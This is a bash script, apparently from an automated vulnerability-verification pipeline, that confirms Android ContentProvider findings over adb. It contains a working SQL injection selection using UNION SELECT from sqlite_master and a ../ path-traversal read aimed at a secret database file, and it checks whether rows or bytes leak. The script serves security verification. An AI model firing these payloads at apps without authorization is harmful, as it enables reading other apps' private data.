#!/usr/bin/env bash
# Copyright 2026 Anthropic PBC
# SPDX-License-Identifier: Apache-2.0
#
# provider_probe.sh — promote a ContentProvider finding by OBSERVING data an
# unprivileged caller must not be able to read.
#   plan:       adb_provider_probe          (find_to_fuzz.py _PLAN_PLAYBOOK)
#   capability: content_provider            (android:content-provider-sqli /
#                                            -traversal)
#   tier:       A (light_adb) — earns strength 2.
#
# What it promotes: a strength-1 static argument "the exported provider builds SQL
# (or an openFile path) from caller input without sanitizing it" into a strength-2
# dynamic_observation — by querying the provider from the adb `shell` uid (an
# unprivileged caller) with (1) a "' OR '1'='1" SELECTION that a sanitized provider
# would reject, and (2) a ../ TRAVERSAL path — and OBSERVING rows / file bytes the
# caller has no business reading.
#
# The witness is the leaked rows/bytes, not that `content` exited 0. A provider
# that requires a permission the shell uid lacks, or that sanitizes the selection
# so the injection returns nothing extra, is GUARD_BLOCKED=true → path REFUTED
# (guard_held), a correctness WIN — reported honestly.
set -u

# ─────────────────────────── <PLACEHOLDERS> ───────────────────────────────────
# Enumerate providers: adb shell dumpsys package <pkg> | grep -iA3 provider
# (note the authority + whether it is exported / has grantUriPermissions).
AUTHORITY="<authority>"            # e.g. com.example.app.provider
QUERY_PATH="<path>"               # a table/path the provider serves, e.g. items
ID_COLUMN="<id_column>"           # a column used in the WHERE clause, e.g. name
# The ' SQLi selection: a sanitized provider rejects/parameterizes it and returns
# only in-scope rows; a vulnerable one returns the whole table (or a UNION'd secret).
SQLI_WHERE="${ID_COLUMN}='x') UNION SELECT * FROM sqlite_master --"
# A ../ traversal read: reach a file outside the path the provider means to expose.
TRAVERSAL_URI="content://${AUTHORITY}/${QUERY_PATH}/../../databases/secret.db"
# Row/byte count above this = data the caller must not see (baseline in-scope rows).
BASELINE_ROWS=0
# ───────────────────────────────────────────────────────────────────────────────

ATTEMPTS=3
# Guard signatures: a permission wall or a rejected selection = path refuted.
DENY_RE='Permission Denial|SecurityException|requires .*permission|not exported|no such|Couldn.t find|Unknown URI'

QUERY_URI="content://${AUTHORITY}/${QUERY_PATH}"

if ! adb get-state >/dev/null 2>&1; then
  printf '### OBSERVATION (feeds promote.py :: Observation) ###\n'
  printf 'EFFECT_OBSERVED=false\nRUNS=0\nOF_RUNS=0\nGUARD_BLOCKED=false\nDEVICE_AVAILABLE=false\nEVIDENCE=no adb device/emulator\n'
  exit 0
fi

# One drive: run BOTH the SQLi query and the traversal read; return their output.
# GOTCHA (adb-shell quoting): the --where value crosses TWO shells (your local one
# and the device shell), so spaces/quotes in $SQLI_WHERE can be re-split on-device.
# If the selection arrives mangled, wrap it for the device shell, e.g.
#   adb shell "content query --uri '$QUERY_URI' --where \"$SQLI_WHERE\""
# and confirm with `adb shell content query ... ` run by hand first.
drive() {
  echo "== sqli =="
  adb shell content query --uri "$QUERY_URI" --where "$SQLI_WHERE" 2>&1
  echo "== traversal =="
  adb shell content read --uri "$TRAVERSAL_URI" 2>&1 | head -c 4096
}

hits=0; guard=false; evidence=""
for i in $(seq 1 "$ATTEMPTS"); do
  out="$(drive)"
  if printf '%s' "$out" | grep -qiE "$DENY_RE"; then
    guard=true; evidence="$(printf '%s' "$out" | grep -iE "$DENY_RE" | head -1)"; continue
  fi
  # OBSERVE: rows leaked by the injection (more than the in-scope baseline), OR
  # file bytes returned by the traversal read (a non-empty body outside scope).
  rows="$(printf '%s' "$out" | grep -c '^Row:')"
  bytes="$(printf '%s' "$out" | awk '/== traversal ==/{f=1;next} f' | wc -c | tr -d ' ')"
  if [ "$rows" -gt "$BASELINE_ROWS" ] || [ "$bytes" -gt 0 ]; then
    hits=$((hits+1))
    evidence="leaked rows=${rows} traversal_bytes=${bytes}: $(printf '%s' "$out" | grep -m1 '^Row:')"
  fi
done

# Determinism: the SAME leaked row count / byte count across all three runs, not
# merely three non-empty results.
effect=false; [ "$hits" -gt 0 ] && effect=true
printf '### OBSERVATION (feeds promote.py :: Observation) ###\n'
printf 'EFFECT_OBSERVED=%s\nRUNS=%s\nOF_RUNS=%s\nGUARD_BLOCKED=%s\nDEVICE_AVAILABLE=true\nEVIDENCE=%s\n' \
  "$effect" "$hits" "$ATTEMPTS" "$guard" "${evidence:-none}"

# effect + 3/3   → promoted, dynamic_observation strength 2 (behavior): provider SQLi/traversal
# guard_blocked  → guard_held (permission wall / sanitized selection — REFUTED, correctness win)
# effect but <3  → contested (flaky); no effect, no guard → contested (provider is scoped correctly / AR5)
